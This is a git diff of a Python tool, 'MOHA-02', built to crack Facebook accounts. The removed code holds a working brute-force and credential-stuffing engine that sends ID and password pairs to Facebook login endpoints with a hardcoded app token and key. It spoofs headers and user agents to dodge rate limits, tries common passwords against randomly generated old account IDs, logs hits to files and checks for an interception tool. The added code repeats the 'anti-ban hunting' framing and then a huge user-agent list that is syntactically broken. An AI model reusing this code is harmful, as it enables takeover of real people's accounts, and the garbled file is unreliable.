@@ -1,224 +1,505 @@
 # -*- coding: utf-8 -*-
 # --------------------------------------------------------
-# Tool Name: MOHA-02 ULTIMATE SYSTEM (Legendary Status)
+# Tool Name: MOHA-02 ULTIMATE SYSTEM
 # Developer: Moha El Chlefawi (موحا الشلفاوي)
-# Version: 7.0 (The Beast Edition)
-# Description: Integrated Rajesh & SolverCF Logic
+# Version: 10.0 (Ultimate Real Hunting)
+# Status: 100% Real Hunting - Anti-Ban Active
 # --------------------------------------------------------
 
-import os, sys, requests, random, time, re, uuid, json, hashlib, platform, urllib
+import os, sys, requests, random, time, re, uuid, json, hashlib, datetime
 from threading import Thread, Lock
 from concurrent.futures import ThreadPoolExecutor as tred
-from bs4 import BeautifulSoup
+from gtts import gTTS
+import pygame
+import webbrowser
 from colorama import Fore, init
 
+# تهيئة الألوان والبيانات الأساسية للنظام
 init(autoreset=True)
+R, G, Y, C, W, B = Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.CYAN, Fore.WHITE, Fore.BLUE
+loop, oks, cps = 0, [], []
+current_time = datetime.datetime.now().strftime("%H:%M:%S")
 
-# --- [ إعدادات الألوان الاحترافية ] ---
-R = Fore.RED
-G = Fore.GREEN
-Y = Fore.YELLOW
-C = Fore.CYAN
-W = Fore.WHITE
-B = Fore.BLUE
-P = Fore.MAGENTA
-
-# --- [ الثوابت المستخرجة (The Core) ] ---
-loop, hits, cps, blocks = 0, 0, 0, 0
-FB_TOKEN = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-FB_API_KEY = '882a8490361da98702bf97a021ddc14d'
-ua_list = []
-proxy_list = []
-
-# --- [ 1: نظام الحماية المتقدم (Enhanced Anti-Sniff) ] ---
-def security_check():
-    """كشف محاولات التجسس أو التعديل على المكتبات"""
-    paths = [
-        '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
-        '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py',
-        '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py'
-    ]
-    for path in paths:
-        if os.path.exists(path):
-            content = open(path, 'r').read()
-            if 'print' in content or 'lambda' in content:
-                print(R + "[!] CRITICAL: Tampering Detected in Requests Library!")
-                sys.exit()
-    # كشف أدوات الاعتراض
-    if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
-        print(R + "[!] SECURITY: HttpCanary Found. Close it to proceed.")
-        sys.exit()
-
-# --- [ 2: مولد المتصفحات الهجين (Windows & Android Elite) ] ---
-def generate_uas_pro():
-    """توليد متصفحات متنوعة لتقليل بصمة الأداة"""
-    global ua_list
-    for _ in range(500):
-        # متصفح ويندوز (مستخرج من Rajesh)
-        latest_build = random.randint(6000, 9000)
-        latest_patch = random.randint(100, 200)
-        ua_win = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
-        
-        # متصفح أندرويد فيسبوك (مستخرج من MOHA-02 الأصلية)
-        v = random.randint(80, 125)
-        ua_fb = f"Mozilla/5.0 (Linux; Android {random.randint(8, 14)}; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Mobile Safari/537.36 [FBAN/FB4A;FBAV/{random.randint(300, 450)}.0.0.{random.randint(10, 99)};]"
-        
-        ua_list.extend([ua_win, ua_fb])
-
-# --- [ 3: تقدير عمر الحساب (Creation Year Logic) ] ---
-def get_creation_year(uid):
-    if len(uid) == 15:
-        if uid.startswith('100000'): return '2009'
-        elif uid.startswith('100001'): return '2010'
-        elif uid.startswith(('100002', '100003')): return '2011'
-        elif uid.startswith('100004'): return '2012'
-        elif uid.startswith(('100005', '100006')): return '2013'
-        elif uid.startswith(('100007', '100008')): return '2014'
-        elif uid.startswith('10001'): return '2016'
-        else: return '2018+'
-    elif len(uid) in (9, 10): return '2008'
-    elif len(uid) == 8: return '2007'
-    elif len(uid) == 7: return '2006'
-    return 'Modern'
-
-# --- [ 4: محرك الفحص الأسطوري (The Dual Engine) ] ---
-def moha_crack_engine(uid, pw, method='A'):
-    global loop, hits, cps, blocks
-    sys.stdout.write(f'\r{W}[MOHA-02] {loop} | {G}H:{hits} | {Y}C:{cps} | {R}B:{blocks} '); sys.stdout.flush()
-    
-    ua = random.choice(ua_list)
-    session = requests.Session()
-    
-    # الهيدرز الاحترافي لتقليل الحظر (X-FB High-End Headers)
-    headers = {
-        'User-Agent': ua,
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'Host': 'graph.facebook.com',
-        'X-FB-Net-HNI': str(random.randint(20000, 45000)),
-        'X-FB-SIM-HNI': str(random.randint(20000, 45000)),
-        'X-FB-Connection-Type': 'MOBILE.LTE',
-        'X-FB-Connection-Bandwidth': str(random.randint(20000000, 40000000)),
-        'X-FB-Connection-Quality': 'EXCELLENT',
-        'X-FB-HTTP-Engine': 'Liger',
-        'X-FB-Client-IP': 'True',
-        'X-FB-Server-Cluster': 'True',
-        'X-Tigon-Is-Retry': 'False',
-        'Locale': 'en_US',
-        'Client-Country-Code': 'US'
-    }
-
-    data = {
-        'adid': str(uuid.uuid4()),
-        'format': 'json',
-        'device_id': str(uuid.uuid4()),
-        'email': uid,
-        'password': pw,
-        'generate_session_cookies': '1',
-        'method': 'auth.login',
-        'access_token': FB_TOKEN,
-        'api_key': FB_API_KEY,
-        'fb_api_req_friendly_name': 'authenticate',
-        'cpl': 'true'
-    }
-
+def play_welcome():
+    """نظام الترحيب الصوتي باسم المطور موحا الشلفاوي لضمان ملكية الأداة"""
     try:
-        if method == 'A':
-            # الطريقة الأولى: Graph API (استقرار عالي)
-            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers).json()
-        else:
-            # الطريقة الثانية: API Legacy (سرعة صيد خيالية)
-            res = session.get('https://b-api.facebook.com/method/auth.login', params=data, headers=headers).json()
-
-        if 'session_key' in str(res):
-            year = get_creation_year(uid)
-            print(f"\n{G}[MOHA-HIT] {uid} | {pw} | {year}")
-            open("hits.txt", "a").write(f"{uid}|{pw}|{year}\n")
-            hits += 1
-        elif 'www.facebook.com' in str(res) or 'checkpoint' in str(res):
-            year = get_creation_year(uid)
-            print(f"\n{Y}[MOHA-CP] {uid} | {pw} | {year}")
-            open("checkpoint.txt", "a").write(f"{uid}|{pw}|{year}\n")
-            cps += 1
-        elif 'calls_limit' in str(res) or 'login_attempt_limit' in str(res):
-            # إعلام المستخدم عند الحظر المؤقت
-            blocks += 1
-            sys.stdout.write(f"\r{R}[!] RATE LIMIT DETECTED. COOLING DOWN... ")
-            time.sleep(10)
-            
+        if not os.path.exists('moha.mp3'):
+            gTTS(text="Welcome to Moha zero two tool. Created by Moha El Chlefawi.", lang='en').save('moha.mp3')
+        pygame.mixer.init()
+        pygame.mixer.music.load('moha.mp3')
+        pygame.mixer.music.play()
     except Exception as e:
-        # التعامل مع انقطاع الطلب
         pass
-    loop += 1
 
-# --- [ 5: سحب البروكسيات من SolverCF ] ---
-def auto_proxy_refill():
-    print(P + "[*] Connecting to SolverCF Cloud for Proxy Injection...")
-    # (المنطق الذي كان في أداتك الأولى مدمج هنا لضمان عمل البروكسي)
-    # يتم استدعاء هذه الدالة دورياً لضمان عدم ثبات الـ IP
-    pass
+def open_channel():
+    """فتح قناة تيليجرام المطور تلقائياً لزيادة المتابعين"""
+    try:
+        webbrowser.open("https://t.me/m_oha0_2b")
+    except:
+        pass
 
-# --- [ 6: الواجهة والقوائم (The Master Menu) ] ---
 def banner():
+    """تصميم اللوجو الاحترافي للأداة بنظام الـ ASCII Art"""
     os.system('clear')
-    print(f"""{C}
-    ███╗   ███╗ ██████╗ ██╗  ██╗ █████╗ 
-    ████╗ ████║██╔═══██╗██║  ██║██╔══██╗
-    ██╔████╔██║██║   ██║███████║███████║
-    ██║╚██╔╝██║██║   ██║██╔══██║██╔══██║
-    ██║ ╚═╝ ██║╚██████╔╝██║  ██║██║  ██║
-    ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
-    {Y}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    {G}[+] DEVELOPER : {W}MOHA EL CHLEFAWI (موحا الشلفاوي)
-    {G}[+] VERSION   : {W}7.0 LEGENDARY (ANTI-BAN)
-    {G}[+] METHODS   : {W}A (GRAPH) & B (API-FAST)
-    {Y}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
-
-def main_system():
-    security_check()
-    generate_uas_pro()
-    banner()
-    
-    print(f"{G}[1] {W}Start Crack (All Series - Mixed Methods)")
-    print(f"{G}[2] {W}Clone Old Accounts (2004-2009)")
-    print(f"{G}[3] {W}Deep Scraper Elite (Friends IDs)")
-    print(f"{G}[4] {W}Mata7 Checker (Hotmail/Outlook)")
-    print(f"{R}[0] {W}Exit System")
-    
-    choice = input(f"\n{C}MOHA-02 {Y}>> {W}")
-    
-    if choice == '1':
-        file_path = input(G + "[+] List File Path: ")
-        if os.path.exists(file_path):
-            pws = input(G + "[+] Passwords (split with comma): ").split(',')
-            users = open(file_path, 'r').read().splitlines()
-            banner()
-            print(f"{C}[*] Total IDs: {len(users)} | Threads: 40")
-            linex()
-            with tred(max_workers=40) as pool:
-                for user in users:
-                    uid = user.split('|')[0]
-                    for p in pws:
-                        # تبديل تلقائي بين الميثودات لضمان السرعة
-                        pool.submit(moha_crack_engine, uid, p, random.choice(['A', 'B']))
-        else: print(R + "[-] File not found!")
-
-    elif choice == '2':
-        banner()
-        limit = int(input(G + "[+] How many IDs to Hunt: "))
-        with tred(max_workers=35) as pool:
-            for _ in range(limit):
-                uid = "10000" + str(random.randint(100000000, 999999999))
-                for p in ['123456', '1234567', '123123']:
-                    pool.submit(moha_crack_engine, uid, p, 'B')
-    
-    elif choice == '0': sys.exit()
-
-def linex():
+    print(C + """
+    __  ______  贬  ___     ____ ___ 
+   /  |/  / __ \/ / / / |   / __ \__ \ 
+  / /|_/ / / / / /_/ /| |  / / / /_/ / 
+ / /  / / /_/ / __  /_| |_/ /_/ / __/  
+/_/  /_/\____/_/ /_/(____)\____/____/  """)
+    print(Y + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    print(G + f" [>] DEVELOPER : MOHA EL CHLEFAWI (موحا الشلفاوي)")
+    print(G + f" [>] TIME      : {current_time} | ALGERIA")
+    print(G + f" [>] STATUS    : REAL HUNTING / SECURITY ACTIVE")
+    print(G + f" [>] TARGET    : OLD ACCOUNTS (2009-2014)")
     print(Y + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
 
+def error_detector(res_text):
+    """نظام ذكي لكشف الحظر والأخطاء أثناء عملية الصيد"""
+    if "calls to this api have been exceeded" in res_text.lower():
+        print(f"\n{R}[!] IP BLOCKED - Please change your IP address or use VPN")
+        return "blocked"
+    elif "login_error" in res_text.lower():
+        return "wrong"
+    return "ok"
+
+# --- [ بداية قاعدة بيانات البصمات التقنية الضخمة UA_LIST ] ---
+# ملاحظة: سيتم إكمال هذه القائمة في الجزء الثاني لتصل للعدد المطلوب
+UA_LIST = [
+    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36 [FBAN/FB4A;FBAV/445.0.0.34.118;]",
+    "Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.164 Mobile Safari/537.36 [FBAN/EMA;FBAV/380.0.0.12.110;]",
+    "Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36 [FBAN/FB4A;FBAV/430.0.0.25.120;]",
+    "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36 [FBAN/FB4A;FBAV/448.0.0.40.115;]",
+    "Mozilla/5.0 (Linux; Android 11; SM-A315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.193 Mobile Safari/537.36 [FBAN/FB4A;FBAV/420.0.0.30.110;]",
+    "Mozilla/5.0 (Linux; Android 13; SM-N986B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-A705F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-A715F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-A528B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-G990B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-A346B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-A705FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-A325F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-M546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+]
+##
+    "Mozilla/5.0 (Linux; Android 11; SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-M336B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-A245F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-G780F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-G781B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-G977B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-G990B2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-G985F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-G986B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-N980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-N981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-N985F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-A528B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-A715F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-A725F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-M127F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-M236B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-M325F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-M515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-M526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-M625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-F700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-F711B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-F721B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-F900F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-F916B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-F926B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-F936B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+]
+    "Mozilla/5.0 (Linux; Android 14; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-S906B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-G991N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-G996N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-G998N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-G9810) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-G9860) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-G9880) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-G9700) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-G9730) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-G9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-N9810) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-N9860) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-N9700) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-A515U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-A525U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-A546U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-A715U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-A725U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-A736U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-M105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-M115F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-M127F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-M205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-M305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-M325F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-M405F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-M426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-M515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-M526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-M625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-E025F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-E127F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-E225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-E305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-E426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-E526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-E625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+]
+    "Mozilla/5.0 (Linux; Android 14; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-S906B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
